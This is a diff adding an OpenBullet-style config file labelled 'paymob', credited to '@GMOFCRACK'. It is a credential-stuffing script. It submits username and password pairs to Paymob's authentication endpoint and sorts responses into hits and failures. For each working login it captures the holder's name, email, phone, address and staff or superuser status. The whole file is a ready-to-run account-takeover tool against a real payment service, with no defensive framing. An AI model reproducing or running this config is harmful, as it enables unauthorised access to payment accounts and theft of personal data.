@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "paymob",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-09T09:46:39.3789818+00:00",
+  "AdditionalInfo": "",
+  "Author": "",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://accept.paymob.com/api/auth/tokens" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"hostname\":\"accept.paymob.com\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#!?-?!_ KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Can not create token" 
+    KEY "This field may not be blank" 
+  KEYCHAIN Success OR 
+    KEY "{\"profile" 
+
+#UserName PARSE "<SOURCE>" JSON "username" CreateEmpty=FALSE -> CAP "UserName" 
+
+#FristName PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "FristName" 
+
+#DataJoined PARSE "<SOURCE>" JSON "date_joined" CreateEmpty=FALSE -> CAP "DataJoined" 
+
+#LastName PARSE "<SOURCE>" JSON "last_name" CreateEmpty=FALSE -> CAP "LastName" 
+
+#Email PARSE "<SOURCE>" JSON "email" CreateEmpty=FALSE -> CAP "Email" 
+
+#IsActive PARSE "<SOURCE>" JSON "is_active" CreateEmpty=FALSE -> CAP "IsActive" 
+
+#IsStaff PARSE "<SOURCE>" JSON "is_staff" CreateEmpty=FALSE -> CAP "IsStaff" 
+
+#is_superuser PARSE "<SOURCE>" JSON "is_superuser" CreateEmpty=FALSE -> CAP "IsSuperuser" 
+
+#profile_type PARSE "<SOURCE>" JSON "profile_type" CreateEmpty=FALSE -> CAP "ProfileType" 
+
+#Phone PARSE "<SOURCE>" JSON "phones" -> VAR "Phone1" 
+
+FUNCTION Translate 
+  KEY "\"" VALUE "" 
+  "<Phone1>" -> VAR "Phone2" 
+
+#PhoneOrgin PARSE "<Phone2>" LR "[" "]" CreateEmpty=FALSE -> CAP "Phone" 
+
+#State PARSE "<SOURCE>" JSON "state" CreateEmpty=FALSE -> CAP "State" 
+
+#Country PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
+
+#City PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "City" 
+
+#postal_code PARSE "<SOURCE>" JSON "postal_code" CreateEmpty=FALSE -> CAP "postal_code" 
+
+FUNCTION Constant "@GMOFCRACK" -> CAP "config by:  " 
+
